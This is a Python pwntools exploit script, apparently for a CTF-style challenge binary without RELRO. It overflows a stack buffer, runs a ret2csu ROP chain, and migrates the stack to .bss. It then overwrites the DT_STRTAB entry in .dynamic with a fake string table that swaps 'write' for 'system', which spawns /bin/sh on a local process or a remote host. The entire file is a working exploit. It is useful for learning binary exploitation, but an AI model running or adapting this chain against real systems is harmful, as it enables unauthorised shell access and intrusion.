from pwn import *
context(os="linux", arch="amd64")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = args.FNAME if (args.FNAME) else "./main_no_relro_64"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def ropArgs3(rdi, rsi, rdx, got_func):
	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
	addr_pop6_ret = 0x40076a
	# mov rdx, r15; mov rsi, r14; mov edi, r13d; 
	# call QWORD PTR [r12+rbx*8];
	# add rbx, 0x1; cmp rbp, rbx; jne 0x400750;
	# add rsp, 0x8;
	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
	addr_mov_call = 0x400750
	return flat([
		addr_pop6_ret,
		0, # rbx
		1, # rbp
		got_func, # r12
		rdi, # r13->edi
		rsi, # r14->rsi
		rdx, # r15->rdx
		addr_mov_call, # ret
		p64(0) * 7,
	])


def pwn():
	vuln_addr = 0x400607
	bss_addr = g_elf.bss()
	data_addr = bss_addr + 0xd0 # data_addr = 0x600c00
	bof_padding_len = 0x70 + 8
	p_rdi = 0x400773 # pop rdi; ret
	write_plt = 0x4004e6
	dynamic_shaddr = g_elf.get_section_by_name(".dynamic")["sh_addr"]
	addr_dt_strtab =  dynamic_shaddr + 0x10*8 + 8
	binsh_addr = data_addr
	sh = b"/bin/sh\0"
	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
	fake_dynstr_addr = binsh_addr + 8
	aligned_data_len = (len(sh) + len(fake_dynstr) + 0xf) & 0xfffffff0
	new_stk = data_addr + aligned_data_len
	
	log.info(".dynamic@%#x\nDT_STRTAB's val=%#x\n.bss@%#x\ndata@%x\nrop@%#x\n", dynamic_shaddr, addr_dt_strtab, bss_addr, data_addr, new_stk)

	padding = 'a' * bof_padding_len
	rop = ROP(g_elf)
	rop.raw(padding)
	#rop.raw(ropArgs3(0, data_addr, aligned_data_len + 0x200, g_elf.got["read"]))
	rop.raw(ropArgs3(0, data_addr, 0x100, g_elf.got["read"]))
	rop.raw(vuln_addr)
	# vuln() don't have enough bof space, we have to do ROP in 2 steps.
	print("rop chain length: %d\n" % len(rop.chain()))
	assert(len(rop.chain()) <= 0x100)
	getpid()
	# 1st. read: bof, ready to read data to .bss and migrate
	g_io.send(rop.chain())
	
	rop = ROP(g_elf)
	rop.raw(ropArgs3(0, addr_dt_strtab, 8, g_elf.got["read"]))
	rop.raw(p_rdi) # pop rdi; ret
	rop.raw(binsh_addr)
	rop.raw(write_plt)
	raw_rop = rop.chain()
	second_read_payload = flat({0:sh, len(sh):fake_dynstr, aligned_data_len:raw_rop})
	# 2nd. read to .bss
	g_io.send(second_read_payload)
	# 3rd. read, from vuln(), to bof of ROP-migrate
	rop = ROP(g_elf)
	rop.raw(padding)
	rop.migrate(new_stk)
	g_io.send(rop.chain())
	# 4th. read to .dynamic's DT_STRTAB entry, make it points to fake_dynstr
	g_io.send(flat(fake_dynstr_addr))

	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
